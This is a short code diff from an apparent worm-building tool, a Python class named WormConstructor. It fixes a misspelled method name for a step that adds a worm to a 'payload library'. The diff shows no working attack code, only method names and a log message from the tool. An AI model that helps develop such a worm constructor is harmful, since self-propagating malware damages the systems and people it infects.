@@ -172,7 +172,7 @@ class WormConstructor:
             case "bin_payload":
                 return self.process_BinPayload
             case "add_to_payload":
-                return self.process_BuildWormAsPayloas
+                return self.process_BuildWormAsPayload
             case _:
                 return self.process_Empty
 
@@ -348,7 +348,7 @@ class WormConstructor:
 
 
     ############# SAVE WORM AS PAYLOAD #########################
-    def process_BuildWormAsPayloas(self, raw_exe: RawExe) -> RawExe:
+    def process_BuildWormAsPayload(self, raw_exe: RawExe) -> RawExe:
         raw_exe.last_process_name = "Process Build Worm As Payload"
         self.msg("msg", f"Add worm to payload library....", sender=self.name)
         if os.path.exists(raw_exe.final_output_fpath):
